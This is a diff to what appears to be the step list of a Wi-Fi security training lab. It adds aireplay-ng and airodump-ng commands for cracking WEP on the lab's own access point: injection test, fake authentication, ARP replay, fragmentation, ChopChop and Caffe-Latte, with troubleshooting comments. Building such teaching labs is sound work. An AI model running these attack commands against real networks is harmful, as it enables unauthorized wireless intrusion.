@@ -105,7 +105,12 @@ const SEGMENTS: Segment[] = [
     target: "ap-target",
     steps: [
       "Set scenario: WEP (button below, or edit hostapd.conf by hand)",
-      "On kali-wifi: airodump-ng -w cap <iface>; aireplay-ng --arpreplay -b <ap-mac> <iface>",
+      "On kali-wifi: aireplay-ng --test <iface>  # confirm this adapter can inject at all",
+      "Second terminal: airodump-ng -c 6 --bssid <ap-mac> -w cap <iface>",
+      "Fake-associate your own MAC FIRST: aireplay-ng -1 0 -a <ap-mac> -h <your-mac> <iface>  # an unassociated MAC's " +
+        "frames are ACKed but dropped by the AP ('Is the source MAC associated?') and no new IVs ever appear",
+      "ARP replay: aireplay-ng --arpreplay -b <ap-mac> -h <your-mac> <iface>  # needs a real ARP request on the air — " +
+        "toggle a client's Wi-Fi off/on so it sends one",
       "Fragmentation: aireplay-ng --fragment -b <ap-mac> <iface>  # builds a keystream, not a full key",
       "ChopChop: aireplay-ng --chopchop -b <ap-mac> <iface>",
       "Café latte (client only, AP can be off): aireplay-ng --caffe-latte -h <client-mac> <iface>",
